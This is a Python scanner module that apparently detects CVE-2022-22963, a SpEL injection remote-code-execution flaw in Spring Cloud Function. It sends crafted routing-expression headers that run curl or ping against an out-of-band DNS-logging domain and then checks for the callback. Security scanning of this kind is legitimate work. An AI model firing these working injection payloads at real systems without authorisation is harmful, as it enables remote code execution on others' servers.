#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import random_md5
from time import sleep

randomName = random_md5()

cve_2022_22963_payloads = [
    {
        'path': 'functionRouter',
        'data': randomName,
        'headers': {
            'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("curl DNSDOMAIN")',
            'Content-Type': 'text/plain'
        }
    },
    {
        'path': 'functionRouter',
        'data': randomName,
        'headers': {
            'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("ping -c 4 DNSDOMAIN")',
            'Content-Type': 'text/plain'
        }
    },
    {
        'path': 'functionRouter',
        'data': randomName,
        'headers': {
            'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("ping DNSDOMAIN")',
            'Content-Type': 'text/plain'
        }
    }
]

def cve_2022_22963_scan(clients):
    ''' Spring Cloud Function中RoutingFunction类的apply方法
            将请求头中的spring.cloud.function.routing-expression参数作为Spel表达式进行处理; 
            造成了Spel表达式注入漏洞, 当使用路由功能时, 攻击者可利用该漏洞远程执行任意代码
    '''
    client = clients.get('reqClient')
    sessid = 'ff864206449349277d8c5b0df7897d4b'

    vul_info = {
        'app_name': 'Spring',
        'vul_type': 'RCE',
        'vul_id': 'CVE-2022-22963',
    }

    for payload in cve_2022_22963_payloads:
        md = random_md5()                                       # * 随机md5值, 8位
        dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

        path = payload['path']
        data = payload['data']
        headers = payload['headers']
        headers['spring.cloud.function.routing-expression'] = headers['spring.cloud.function.routing-expression'].replace('DNSDOMAIN', dns_domain)

        res = client.request(
            'post',
            path,
            data=data,
            headers=headers,
            vul_info=vul_info
        )
        if res is None:
            continue

        sleep(3)                                                # * dns查询可能较慢, 等一会
        if (dns.result(md, sessid)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
